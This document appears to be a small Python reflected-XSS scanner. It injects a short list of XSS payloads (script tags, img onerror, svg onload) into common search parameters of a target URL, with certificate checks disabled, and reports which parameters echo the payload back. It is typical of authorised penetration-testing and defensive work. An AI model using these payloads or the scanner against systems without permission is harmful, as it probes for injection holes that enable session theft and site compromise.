#!/usr/bin/env python3
"""
Reflected XSS Scanner
Advanced reflected XSS detection
"""

import requests
import argparse
import warnings
warnings.filterwarnings('ignore')

PAYLOADS = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '"><script>alert(1)</script>',
    "'><img src=x onerror=alert(1)>",
]

def scan(target):
    print(f"[*] Reflected XSS Scanner - {target}")
    print("="*50)
    
    if not target.startswith(('http://', 'https://')):
        target = 'https://' + target
    
    found = []
    params = ['q', 'search', 'query', 's', 'keyword', 'term', 'q', 'query']
    
    for param in params:
        for payload in PAYLOADS[:3]:
            try:
                r = requests.get(target, params={param: payload}, timeout=10, verify=False)
                if payload in r.text:
                    print(f"[!] Reflected XSS: {param}")
                    found.append(param)
            except:
                pass
    
    print("\n" + "="*50)
    print(f"[*] Found {len(found)} reflected XSS")
    
    return found

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Reflected XSS')
    parser.add_argument('target', help='Target URL')
    args = parser.parse_args()
    scan(args.target)